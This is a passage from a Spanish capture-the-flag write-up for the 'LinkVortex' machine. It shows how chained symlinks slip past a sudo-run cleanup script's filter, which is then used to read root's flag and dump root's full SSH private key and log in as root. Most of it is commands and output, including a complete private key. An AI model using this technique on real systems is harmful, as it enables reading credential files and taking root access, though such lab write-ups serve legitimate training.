`readlink final.png` devuelve `/tmp/safe/data.txt` → no contiene ni "root" ni "etc" pero al seguirlo se accede a `/root/root.txt`

```bash
bob@linkvortex:/tmp$ mkdir /tmp/safe
bob@linkvortex:/tmp$ ln -s /root/root.txt /tmp/safe/data.txt

bob@linkvortex:/tmp/safe$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh p3rr1n.png 
Link found [ p3rr1n.png ] , moving it to quarantine
Content:
4424ac02f0e3ad99bc61a18f2afb0a95
bob@linkvortex:/tmp/safe$ 
```

Veo que funciono, para obtener una shell como root seguí el mismo procedimiento pero apuntando a **/root/.ssh/id_rsa**

```bash
bob@linkvortex:/tmp$ rm -r safe/
bob@linkvortex:/tmp$ mkdir /tmp/safe
bob@linkvortex:/tmp$ ln -s /root/.ssh/id_rsa /tmp/safe/data.txt
bob@linkvortex:/tmp$ ln -s /tmp/safe/data.txt p3rr1n.png
bob@linkvortex:/tmp$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh p3rr1n.png
Link found [ p3rr1n.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
bob@linkvortex:/tmp$ 
```

Finalmente inicie sesión mediante ssh con la llave de root

```bash
┌──(root㉿kali)-[/opt/git-dumper/linkvortex]
└─# ssh -i id_rsa root@10.10.11.47    
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~# whoami
root
root@linkvortex:~# 
```

